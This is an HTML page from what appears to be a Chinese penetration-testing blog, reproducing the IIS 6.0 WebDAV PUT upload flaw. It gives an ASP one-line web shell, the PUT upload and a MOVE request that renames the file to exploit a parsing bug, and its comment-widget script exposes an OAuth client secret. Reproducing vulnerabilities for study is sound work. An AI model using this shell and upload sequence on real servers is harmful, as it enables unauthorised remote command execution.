@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+    <meta name="description" content="内网渗透实战篇">
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    IIS6.0PUT 上传漏洞 |
+    
+    炎Φ帝</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/technology.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <section class="outer">
+  <article id="post-IIS6-0PUT-上传漏洞" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      IIS6.0PUT 上传漏洞
+    </h1>
+  
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2021/03/09/IIS6-0PUT-%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2021-03-09T13:11:57.000Z" itemprop="datePublished">2021-03-09</time>
+</a>
+        
+      </div>
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+      
+
+      
+        <p>1、漏洞介绍</p>
+<pre><code>    IIS 6.0 PUT 上传漏洞。产生原因是 IIS Server 在 Web 服务扩展中开启了 WebDAV。并且管理员在配置权限时，没有遵循最小原则。给 IIS 配置了可以写入的权限，包括网站根目录。
+
+    也叫做 IIS 写权限漏洞</code></pre>
+<p>2、复现</p>
+<pre><code>     打开站是这样的</code></pre>
+<p><img src="/images/pasted-150.png" alt="upload successful"></p>
+<pre><code>    抓包
+    将 GET 修改为 OPTIONS 查看可执行命令：</code></pre>
+<p><img src="/images/pasted-151.png" alt="upload successful"></p>
+<pre><code>   可看到支持PUT方法
+   然后我们 PUT 一个 ASP 一句话上去，文件名随便写比如 2.txt：
+   &lt;%eval request(&quot;cmd&quot;)%&gt;
+   返回201即上传成功</code></pre>
+<p><img src="/images/pasted-152.png" alt="upload successful"></p>
+<pre><code>  可以看到txt写进去了</code></pre>
+<p><img src="/images/pasted-153.png" alt="upload successful"></p>
+<pre><code>  然后就可以使用 MOVE 命令把 2.txt 改为 2.asp;.jpg 让解析漏洞解析 asp
+  核心语句如下；
+
+ MOVE /2.txt HTTP/1.1
+ Host: ip:端口
+ Destination: /2.asp;.jpg
+ &lt;%eval request(&quot;cmd&quot;)%&gt;
+ 返回401，这个不影响，直接上蚁剑连接：</code></pre>
+<p><img src="/images/pasted-154.png" alt="upload successful"></p>
+<p><img src="/images/pasted-155.png" alt="upload successful"></p>
+<p><img src="/images/pasted-156.png" alt="upload successful"></p>
+<div id="gitalk-container"></div>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script src="https://priesttomb.github.io/js/md5.min.js"></script>
+<script >
+var gitalk = new Gitalk({
+  clientID: '89b3b32fddb4b2644811',
+  clientSecret: 'b6c19077bfed9b255a3a17f4d628854f21098b94',
+  repo: 'shenligang123.github.io',
+  owner: 'shenligang123',
+  admin: 'shenligang123',
+  id: md5(location.pathname),      // Ensure uniqueness and length less than 50
+  distractionFreeMode: false  // Facebook-like distraction free mode
+})
+gitalk.render('gitalk-container')
+</script>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/03/09/IIS6-0PUT-%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" data-id="ckm94vxp30003fcutcenxbcd1"
+         class="article-share-link">分享</a>
+      
+    </footer>
+
+  </div>
+
+  
+    
+  <nav class="article-nav">
+    
+      <a href="/2021/03/09/uWSGI-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2018-7490%EF%BC%89/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            uWSGI 漏洞复现（CVE-2018-7490）
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2021/03/08/%E5%90%84%E7%B1%BB%E5%AE%B9%E5%99%A8%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">各类容器解析漏洞</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+  
+    
+  <div class="gitalk" id="gitalk-container"></div>
+  
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+
+  
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+  
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+
+  <script type="text/javascript">
+    var gitalk = new Gitalk({
+      clientID: '89b3b32fddb4b2644811',
+      clientSecret: 'b6c19077bfed9b255a3a17f4d628854f21098b94',
+      repo: 'shenligang123.github.io',
+      owner: 'shenligang123',
+      admin: ['shenligang123'],
+      // id: location.pathname,      // Ensure uniqueness and length less than 50
+      id: md5(location.pathname),
+      distractionFreeMode: false,  // Facebook-like distraction free mode
+      pagerDirection: 'last'
+    })
+
+  gitalk.render('gitalk-container')
+  </script>
+
+  
+
+</article>
+
+
+
+</section>
+    </div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+
+
+<script src="/js/technology.js"></script>
+
+
+  </div>
+</body>
+</html>
